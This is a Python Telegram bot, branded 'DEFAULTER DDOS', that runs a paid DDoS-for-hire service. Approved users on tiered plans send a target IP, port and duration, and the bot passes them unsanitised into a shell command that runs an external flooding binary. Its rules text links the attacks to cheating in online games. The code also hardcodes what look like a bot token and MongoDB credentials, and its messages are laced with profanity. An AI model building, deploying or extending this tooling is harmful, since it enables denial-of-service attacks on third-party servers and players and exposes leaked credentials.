import os
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import random
from subprocess import Popen
from threading import Thread
import asyncio
import aiohttp
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

loop = asyncio.get_event_loop()

TOKEN = '8146887226:AAH1PTala3ePefhKnsMOcgW19lQZgJ_VlQc'
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
FORWARD_CHANNEL_ID = -1002275420758
CHANNEL_ID = -1002275420758
error_channel_id = -1002275420758

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['zoya']
users_collection = db.users

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]  # Blocked ports list

async def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    await start_asyncio_loop()

def update_proxy():
    proxy_list = [
        "https://80.78.23.49:1080"
    ]
    proxy = random.choice(proxy_list)
    telebot.apihelper.proxy = {'https': proxy}
    logging.info("Proxy updated successfully.")

@bot.message_handler(commands=['update_proxy'])
def update_proxy_command(message):
    chat_id = message.chat.id
    try:
        update_proxy()
        bot.send_message(chat_id, "Proxy updated successfully.")
    except Exception as e:
        bot.send_message(chat_id, f"Failed to update proxy: {e}")

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./Moin {target_ip} {target_port} {duration} 1000")
    await process.communicate()
    bot.attack_in_progress = False

def is_user_admin(user_id, chat_id):
    try:
        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
    except:
        return False

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_admin = is_user_admin(user_id, CHANNEL_ID)
    cmd_parts = message.text.split()

    if not is_admin:
        bot.send_message(chat_id, "*Bhag bhosdike!*\n"
                                   "*Baap ko bhej.*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Chutiya hai kya.*\n"
                                   "*Lode ye dono me se ek use kar:*\n"
                                   "*1. /approve <user_id> <plan> <days>*\n"
                                   "*2. /disapprove <user_id>*", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    target_username = message.reply_to_message.from_user.username if message.reply_to_message else None
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0

    if action == '/approve':
        if plan == 1:  # Instant Plan 🧡
            if users_collection.count_documents({"plan": 1}) >= 99:
                bot.send_message(chat_id, "*🚫 Approval Failed: Instant Plan 🧡 limit reached (99 users).*", parse_mode='Markdown')
                return
        elif plan == 2:  # Instant++ Plan 💥
            if users_collection.count_documents({"plan": 2}) >= 499:
                bot.send_message(chat_id, "*🚫 Approval Failed: Instant++ Plan 💥 limit reached (499 users).*", parse_mode='Markdown')
                return

        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"user_id": target_user_id, "username": target_username, "plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        msg_text = (f"*🎉 Congratulations!*\n"
                    f"*User {target_user_id} has been approved!*\n"
                    f"*Plan: {plan} for {days} days!*\n"
                    f"*Welcome to our community! Let’s make some magic happen! ✨*")
    else:  # disapprove
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        msg_text = (f"*❌ Disapproval Notice!*\n"
                    f"*User {target_user_id} has been disapproved.*\n"
                    f"*They have been reverted to free access.*\n"
                    f"*Encourage them to try again soon! 🍀*")

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')



# Initialize attack flag, duration, and start time
bot.attack_in_progress = False
bot.attack_duration = 0  # Store the duration of the ongoing attack
bot.attack_start_time = 0  # Store the start time of the ongoing attack

@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*🚫 Access Denied!*\n"  # Access Denied message
                                       "*Bsdk admin se approval to lele*\n"  # Need approval message
                                       "*Lode owner se baat kar.Owner yha hai @crossbeats7262.*", parse_mode='Markdown')  # Contact owner message
            return

        # Check plan limits
        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
            bot.send_message(chat_id, "*🧡 Instant Plan is currently full!* \n"  # Instant Plan full message
                                       "*Please consider upgrading for priority access.*", parse_mode='Markdown')  # Upgrade message
            return

        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
            bot.send_message(chat_id, "*💥 Instant++ Plan is currently full!* \n"  # Instant++ Plan full message
                                       "*Consider upgrading or try again later.*", parse_mode='Markdown')  # Upgrade message
            return

        if bot.attack_in_progress:
            bot.send_message(chat_id, "*⚠️ Ruk ja!*\n"  # Busy message
                                       "*Already attack chal rha hai lode.*\n"  # Current attack message
                                       "* /when ye likh pta chal jayega kitna time bacha hai*", parse_mode='Markdown')  # Check remaining time
            return

        bot.send_message(chat_id, "*Ready ho ja attack krne ke liye*\n"  # Ready to launch message
                                   "*IP, port, aur duration in seconds daal.*\n"  # Provide details message
                                   "*Example: 167.67.25 6296 60 aache se dekh le bsdk* 🔥\n"  # Example message
                                   "*Server ki maa chodo🎉*", parse_mode='Markdown')  # Start chaos message
        bot.register_next_step_handler(message, process_attack_command)

    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*❗ Error!*\n"  # Error message
                                               "*Aache se daal na bsdk*\n"  # Correct format message
                                               "*Make sure to provide all three inputs! 🔄*", parse_mode='Markdown')  # Three inputs message
            return

        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*🔒 Port {target_port} is blocked.*\n"  # Blocked port message
                                               "*Please select a different port to proceed.*", parse_mode='Markdown')  # Different port message
            return
        if duration >= 600:
            bot.send_message(message.chat.id, "*⏳ Bhosdike 599 seconds se kam daal.*\n"  # Duration limit message
                                               "*Chal time kam kar*", parse_mode='Markdown')  # Shorten duration message
            return  

        bot.attack_in_progress = True  # Mark that an attack is in progress
        bot.attack_duration = duration  # Store the duration of the ongoing attack
        bot.attack_start_time = time.time()  # Record the start time

        # Start the attack
        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(message.chat.id, f"*🚀 Attack lg gya hai🚀*\n\n"  # Attack launched message
                                           f"*📡 Target Host: {target_ip}*\n"  # Target host message
                                           f"*👉 Target Port: {target_port}*\n"  # Target port message
                                           f"*⏰ Duration: {duration} seconds! Server ki maa chud gyi! 🔥*", parse_mode='Markdown')  # Duration message

    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")





def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

@bot.message_handler(commands=['when'])
def when_command(message):
    chat_id = message.chat.id
    if bot.attack_in_progress:
        elapsed_time = time.time() - bot.attack_start_time  # Calculate elapsed time
        remaining_time = bot.attack_duration - elapsed_time  # Calculate remaining time

        if remaining_time > 0:
            bot.send_message(chat_id, f"*⏳ Time: {int(remaining_time)} seconds... bacha hai*\n"
                                       "*🔍 Ruk ja!*\n"
                                       "*💪 Stay tuned for updates!*", parse_mode='Markdown')
        else:
            bot.send_message(chat_id, "*🎉 Attack khatam*\n"
                                       "*🚀 Chal attack lga*", parse_mode='Markdown')
    else:
        bot.send_message(chat_id, "*❌ Koi attack nhi chal rha ip port aur time daalke attack kar*\n"
                                   "*🔄 Attack lga le*", parse_mode='Markdown')


@bot.message_handler(commands=['myinfo'])
def myinfo_command(message):
    user_id = message.from_user.id
    user_data = users_collection.find_one({"user_id": user_id})

    if not user_data:
        # User not found in the database
        response = "*❌ Oops! No account information found!* \n"  # Account not found message
        response += "*Lode admin ke pass ja @crossbeats7262* "  # Contact owner message
    elif user_data.get('plan', 0) == 0:
        # User found but not approved
        response = "*🔒 Your account is still pending approval!* \n"  # Not approved message
        response += "*Admin se baat krle @crossbeats7262* 🙏"  # Contact owner message
    else:
        # User found and approved
        username = message.from_user.username or "Unknown User"  # Default username if none provided
        plan = user_data.get('plan', 'N/A')  # Get user plan
        valid_until = user_data.get('valid_until', 'N/A')  # Get validity date
        current_time = datetime.now().isoformat()  # Get current time
        response = (f"*👤 Tera naam: @{username}* \n"  # Username
                    f"*💸 PLAN: {plan}* \n"  # User plan
                    f"*⏳ VALID UNTIL: {valid_until}* \n"  # Validity date
                    f"*⏰ Abhi ka time: {current_time}* \n"  # Current time
                    f"*🌟 Thank you for being an important part of our community! If you have any questions or need help, just ask! We’re here for you!* 💬🤝")  # Community message

    bot.send_message(message.chat.id, response, parse_mode='Markdown')

@bot.message_handler(commands=['rules'])
def rules_command(message):
    rules_text = (
        "*📜 Aache se rules dekhle bhosdike wrna id ban hogi baad me na bolna!\n\n"
        "1. Attacks spam mat kar! ⛔ \nContinue use mat kar beech beech me tdm unranked ya without ddos khel le.\n\n"
        "2. Kam kills kar! 🔫 \n30-40 kill kar limit me rehke.\n\n"
        "3. Dimag se khel! 🎮 \nDhyan rakhna reports na maare koi.\n\n"
        "4. Mods use mat kar! 🚫 \nDusra koi bhi hacks use mat kar esp ya bullet hack.\n\n"
        "💡 Rules follow karke khel kuch problem nhi hogi!*"
    )

    try:
        bot.send_message(message.chat.id, rules_text, parse_mode='Markdown')
    except Exception as e:
        print(f"Error while processing /rules command: {e}")

    except Exception as e:
        print(f"Error while processing /rules command: {e}")


@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = ("*🌟 Welcome to the Ultimate Command Center!*\n\n"
                 "*Here’s what you can do:* \n"
                 "1. *`/attack` - ⚔️ Attack karne ke liye ye likh!*\n"
                 "2. *`/myinfo` - 👤 Tera account details.*\n"
                 "3. *`/owner` - 📞 Owner se baat karne ke liye kuch dikkat ho to!*\n"
                 "4. *`/when` - ⏳ Attack me kitna time bacha hai wo dekhne ke liye !*\n"
                 "5. *`/rules` - 📜 Rules dekh le attack karne se pehle.*\n\n"
                 "*💡 Aur kuch dikkat ho to dm me aaja @crossbeats7262*")

    try:
        bot.send_message(message.chat.id, help_text, parse_mode='Markdown')
    except Exception as e:
        print(f"Error while processing /help command: {e}")



@bot.message_handler(commands=['owner'])
def owner_command(message):
    response = (
        "*👤 **Owner Information:**\n\n"
        "Owner ka information hai ye:\n\n"
        "📩 **Telegram:** @crossbeats7262\n\n"
        "💬 **Feedback dena jaruri hai nhi to bot off.\n\n"
        "🌟 **Thank you.*\n"
    )
    bot.send_message(message.chat.id, response, parse_mode='Markdown')

@bot.message_handler(commands=['start'])
def start_message(message):
    try:
        bot.send_message(message.chat.id, "*WELCOME TO DEFAULTER DDOS.Use /attack to launch attack.For any help use /help \n\n", 
                                           parse_mode='Markdown')
    except Exception as e:
        print(f"Error while processing /start command: {e}")


if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("Starting Codespace activity keeper and Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        time.sleep(REQUEST_INTERVAL)
